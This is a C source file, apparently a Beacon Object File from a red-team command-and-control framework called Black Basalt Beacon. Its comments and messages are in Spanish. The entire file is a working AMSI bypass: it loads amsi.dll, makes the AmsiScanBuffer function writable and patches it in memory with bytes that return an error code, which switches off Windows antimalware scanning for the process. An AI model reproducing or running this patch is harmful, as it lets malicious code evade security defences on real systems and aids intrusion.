/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

// ================================
// IMPORTS DIRECTOS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_VirtualProtect;
extern PVOID __imp_RtlCopyMemory;

// ================================
// FUNCIÓN PRINCIPAL
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[AMSI]  Iniciando bypass AMSI (patch en memoria)...\n");

    HMODULE hAmsi = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("amsi.dll");
    if (!hAmsi) {
        BeaconPrintf(CALLBACK_ERROR, "[AMSI] amsi.dll no cargada\n");
        return;
    }

    FARPROC pAmsiScanBuffer = ((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[AMSI] AmsiScanBuffer no encontrada\n");
        return;
    }

    // Patch: MOV EAX, 80070057h + RET (S_OK → E_FAIL + return)
    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 (E_FAIL)
        0xC3                           // ret
    };

    DWORD oldProtect;
    if (!((BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))__imp_VirtualProtect)(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "[AMSI] VirtualProtect falló\n");
        return;
    }

    ((void(WINAPI*)(PVOID, PVOID, SIZE_T))__imp_RtlCopyMemory)(pAmsiScanBuffer, patch, sizeof(patch));

    ((BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))__imp_VirtualProtect)(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[AMSI] AmsiScanBuffer parchada exitosamente\n");
}
